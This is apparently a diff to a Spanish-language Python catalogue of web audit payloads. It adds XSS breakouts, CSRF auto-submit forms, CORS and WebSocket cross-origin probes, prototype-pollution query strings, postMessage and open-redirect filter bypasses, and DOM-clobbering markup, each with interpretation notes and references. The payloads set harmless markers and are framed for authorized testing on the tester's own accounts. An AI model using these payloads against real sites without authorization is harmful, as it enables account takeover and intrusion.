@@ -324,3 +324,116 @@ for _slug, _pruebas in AMPLIACIONES.items():
         (_nombre, _objetivo, _lenguaje, _codigo.replace('\\n', '\n'), _interpretacion, _fuente)
         for _nombre, _objetivo, _lenguaje, _codigo, _interpretacion, _fuente in _pruebas
     ]
+
+# Contextos adicionales documentados: cada variante requiere una fuente o sink distinto.
+AMPLIACIONES['xss'].extend([
+    ('Atributo entre comillas simples', 'Cerrar solo un valor HTML delimitado con comillas simples.', 'html',
+     r"""' autofocus onfocus="document.body.dataset.xss='prueba-123'" x='""",
+     'Inspeccionar el HTML final: debe existir un nuevo onfocus y dispararse en un elemento que acepte foco.', PS_XSS),
+    ('Input hidden con accesskey', 'Probar un valor reflejado dentro de input type=hidden; requiere una combinación de teclas del auditor.', 'html',
+     r'''" accesskey="x" onclick="document.body.dataset.xss='prueba-123'" x="''',
+     'No basta autofocus porque el input está oculto. Verificar la tecla de acceso en el navegador real y el evento onclick.',
+     'https://portswigger.net/research/xss-in-hidden-input-fields'),
+    ('Cadena JavaScript entre comillas dobles', 'Salir de una cadena JS delimitada por comillas dobles sin romper el resto del script.', 'js',
+     r'''";document.body.dataset.xss='prueba-123';//''',
+     'Comprobar el JavaScript generado y la ejecución. Esta variante no sustituye la prueba para comillas simples.', PS_XSS),
+    ('Query DOM hacia innerHTML', 'Usar cuando URLSearchParams alimenta innerHTML u otro sink que parsea HTML.', 'text',
+     r'''https://{ORIGEN}/page?q=%3Cimg%20src%3Dx%20onerror%3D%22document.body.dataset.xss%3D123%22%3E''',
+     'El navegador debe decodificar q y crear el img; localizar la asignación al sink, no inferir XSS del fragmento visible.', PS_DOM_XSS),
+    ('Query DOM hacia document.write', 'Distinguir document.write, que parsea etiquetas script, de innerHTML.', 'text',
+     r'''https://{ORIGEN}/page?q=%3Cscript%3Edocument.documentElement.dataset.xss%3D123%3C%2Fscript%3E''',
+     'Solo aplica si el dato decodificado llega a document.write durante el parseo; verificar CSP y ejecución en DOM.', PS_DOM_XSS),
+])
+
+AMPLIACIONES['csrf'].extend([
+    ('GET con _method=POST', 'Probar un framework que convierte una navegación GET superior en una acción POST.', 'html',
+     r'''<form action="https://{ORIGEN}/api/profile" method="GET"><input name="_method" value="POST"><input name="displayName" value="prueba-123"></form><script>document.forms[0].submit()</script>''',
+     'Solo existe bypass si el router reconoce _method, viaja la cookie Lax y el cambio propio se aplica sin token.', PS_SAMESITE),
+    ('SameSite Strict mediante redirección cliente', 'Usar un gadget de redirección JavaScript en el mismo site que navegue a una acción GET propia.', 'html',
+     r'''<a href="https://{ORIGEN}/redirect?next=%2Fapi%2Fprofile%2Fset-name%3Fvalue%3Dprueba-123">Abrir prueba</a>''',
+     'La segunda navegación debe originarse en JavaScript del sitio; una respuesta HTTP 30x mantiene la restricción de SameSite.', PS_SAMESITE),
+    ('Formulario multipart simple', 'Probar una ruta que acepta multipart/form-data sin token desde un origen ajeno.', 'html',
+     r'''<form action="https://{ORIGEN}/api/profile" method="POST" enctype="multipart/form-data"><input name="displayName" value="prueba-123"></form><script>document.forms[0].submit()</script>''',
+     'Inspeccionar Content-Type real, cookies y cambio reversible en cuenta propia; aceptar multipart puede ser funcionalidad normal.', PATT_CSRF),
+])
+
+AMPLIACIONES['cors'].extend([
+    ('Intranet sin credenciales', 'Desde una página controlada, probar lectura de recurso interno público inaccesible para el auditor externo.', 'js',
+     r'''fetch('https://{INTRANET_HOST}/api/public',{credentials:'omit'}).then(r=>r.text()).then(t=>console.log(t.length)).catch(console.error)''',
+     'Requiere que el navegador del entorno pueda llegar al host interno y que CORS permita ese origen; PNA, TLS o mixed content pueden bloquear.', PS_CORS),
+    ('Cabecera personalizada expuesta', 'Comprobar si CORS permite leer un header de prueba no safelisted de una respuesta autenticada.', 'js',
+     r'''fetch('https://{ORIGEN}/api/me',{credentials:'include'}).then(r=>console.log(r.headers.get('X-Own-Marker')))''',
+     'Debe existir Access-Control-Expose-Headers: X-Own-Marker, ACAO concreto y cookie enviada; usar solo un marcador propio.', PS_CORS_SPEC),
+])
+
+AMPLIACIONES['prototype-pollution'].extend([
+    ('Gadget fetch headers', 'Probar un fetch del sitio cuyo objeto options omite headers y hereda la propiedad.', 'text',
+     r'''https://{ORIGEN}/?__proto__[headers][X-Prueba]=prueba-123''',
+     'Verificar en DevTools que la solicitud saliente a un endpoint propio contiene X-Prueba. Una marca en Object.prototype sola no prueba gadget.',
+     'https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis'),
+    ('Gadget Object.defineProperty value', 'Probar descriptor sin valor propio pasado a Object.defineProperty por el código cliente.', 'text',
+     r'''https://{ORIGEN}/?__proto__[value]=prueba-123''',
+     'Solo aplica si se observó ese descriptor; comprobar que la propiedad definida toma el marcador y que un sink posterior lo usa.',
+     'https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis'),
+    ('Getter de rastreo local', 'Localizar lectura de un posible gadget tras confirmar fuente de contaminación.', 'js',
+     r'''Object.defineProperty(Object.prototype,'marcaPrueba',{configurable:true,get(){console.trace('marcaPrueba');return 'prueba-123'}})''',
+     'Ejecutar solo en DevTools de cuenta propia y recargar al terminar. La traza muestra lectura, no explotación sin sink.', PS_PROTO),
+    ('Formulario anidado a merge', 'Probar si el parser urlencoded crea un objeto y el cliente lo fusiona profundamente.', 'text',
+     r'''__proto__%5BmarcaPrueba%5D=prueba-123''',
+     'Enviar como cuerpo application/x-www-form-urlencoded únicamente a una función propia que procese ese formato; observar herencia.', PATT_PROTO),
+])
+
+AMPLIACIONES['websocket-hijacking'].extend([
+    ('Origin null desde iframe sandbox', 'Abrir el canal desde un documento de origen opaco controlado.', 'html',
+     r'''<iframe sandbox="allow-scripts" srcdoc="<script>const ws=new WebSocket('wss://{ORIGEN}/ws');ws.onopen=()=>parent.postMessage('ws-abierto','*')</script>"></iframe>''',
+     'El navegador enviará Origin: null; comprobar cookies y datos de cuenta propia. Un 101 aislado no confirma CSWSH.', PS_WS),
+    ('Emisor en dominio hermano', 'Servir la página de prueba en un subdominio propio del mismo site para evaluar cookies SameSite=Strict.', 'js',
+     r'''const ws=new WebSocket('wss://{ORIGEN}/ws');ws.onmessage=e=>console.log('bytes',e.data.length);''',
+     'Ejecutar desde https://{SUBDOMINIO_CONTROLADO}.{ORIGEN}. Verificar Origin distinto, cookie enviada y mensaje privado propio.',
+     'https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain'),
+    ('Acción propia por mensaje cruzado', 'Tras confirmar el canal cruzado, enviar solo un mensaje reversible según el esquema observado.', 'js',
+     r'''const ws=new WebSocket('wss://{ORIGEN}/ws');ws.onopen=()=>ws.send(JSON.stringify({message:'prueba-123'}));''',
+     'Adaptar la estructura al tráfico real y verificar en otra cuenta propia; abrir el socket no prueba capacidad de escritura.', PS_WS),
+    ('Trama binaria recibida', 'Inspeccionar canales que envían ArrayBuffer en lugar de texto.', 'js',
+     r'''const ws=new WebSocket('wss://{ORIGEN}/ws');ws.binaryType='arraybuffer';ws.onmessage=e=>console.log(e.data instanceof ArrayBuffer?e.data.byteLength:e.data.length);''',
+     'Registrar solo tamaño de tramas propias; el formato binario puede ocultar datos a un monitor que solo mide string.length.', PS_WS),
+])
+
+AMPLIACIONES['postmessage'].extend([
+    ('Bypass de startsWith', 'Probar un listener que acepta un prefijo textual sin límite de host.', 'text',
+     r'''https://{DOMINIO_PERMITIDO}.{CONTROLLED_HOST}''',
+     'Hospedar allí el emisor y comprobar una acción concreta; solo funciona si el código usa startsWith sobre event.origin.', PS_MESSAGE),
+    ('Emisor con Origin null', 'Enviar un mensaje desde un iframe sandbox a un receptor abierto en la primera ventana hija.', 'html',
+     r'''<iframe src="https://{ORIGEN}/widget"></iframe><iframe sandbox="allow-scripts" srcdoc="<script>parent.frames[0].postMessage('prueba-123','https://{ORIGEN}')</script>"></iframe>''',
+     'El segundo iframe tiene event.origin null; usarlo solo si el listener confía erróneamente en null y confirmar efecto.', PS_MESSAGE),
+    ('Objeto recibido como JSON string', 'Probar un receptor que primero hace JSON.parse(event.data) y luego escribe html.', 'js',
+     r'''destino.contentWindow.postMessage(JSON.stringify({type:'render',html:'<img src=x onerror="document.body.dataset.msg=123">'}),'https://{ORIGEN}')''',
+     'Adaptar type y propiedad al handler observado; el éxito exige parseo, sink HTML y ejecución en el receptor.', PS_MESSAGE),
+    ('Ventana emergente como source', 'Comparar validación por event.source cuando el receptor se abre como popup propio.', 'js',
+     r'''const w=window.open('https://{ORIGEN}/widget');setTimeout(()=>w.postMessage({type:'probe',value:'prueba-123'},'https://{ORIGEN}'),1000)''',
+     'El popup debe permitir apertura y haber cargado antes del mensaje. Verificar origin y acción; source solo no autentica al emisor.', PS_MESSAGE),
+])
+
+AMPLIACIONES['open-redirect'].extend([
+    ('Separador Unicode en el host', 'Probar validador textual que no normaliza el punto ideográfico antes de comparar dominios.', 'text',
+     r'''https://{HOST_PERMITIDO}%E3%80%82{CONTROLLED_HOST}/prueba''',
+     'El navegador normaliza %E3%80%82 a punto y el host final debe quedar bajo control del auditor; verificar Location y navegación.', PATT_REDIRECT),
+    ('Slash y backslash alternos', 'Probar un filtro que solo bloquea dos barras normales antes de pasar el valor al navegador.', 'text',
+     r'''/\/{CONTROLLED_HOST}/prueba''',
+     'El comportamiento depende del parser y navegador; solo hay hallazgo si se navega al host propio fuera del site.', PATT_REDIRECT),
+])
+
+AMPLIACIONES['dom-clobbering'].extend([
+    ('RadioNodeList en formulario', 'Probar dos controles homónimos que forman una colección bajo un form propio.', 'html',
+     r'''<form id="configPrueba"><input id="ruta" name="marcaPrueba" value="prueba-123"><input id="ruta"></form>''',
+     'En Chrome, inspeccionar configPrueba.ruta y sus métodos de colección; exige un gadget que use la propiedad heredada.',
+     'https://portswigger.net/research/dom-clobbering-strikes-back'),
+    ('Iframe name y global interno', 'Comprobar cadena de nombres entre ventana padre y srcdoc del mismo origen.', 'html',
+     r'''<iframe name="marcoPrueba" srcdoc="<a id='configPrueba' href='https://{CONTROLLED_HOST}/marca'>prueba</a>"></iframe>''',
+     'Inspeccionar window.marcoPrueba.configPrueba tras cargar el iframe; depende de navegador y de que el HTML inyectado permita iframe.',
+     'https://portswigger.net/research/dom-clobbering-strikes-back'),
+    ('ID duplicado antes de elemento legítimo', 'Probar una lectura document.getElementById que toma el primer elemento con ID repetido.', 'html',
+     r'''<div id="cdnDomain" style="display:none">prueba-123</div>''',
+     'Solo aplica si se inyecta antes del nodo legítimo y un script usa su innerText; demostrar el sink sin alterar recursos ajenos.',
+     'https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering'),
+])
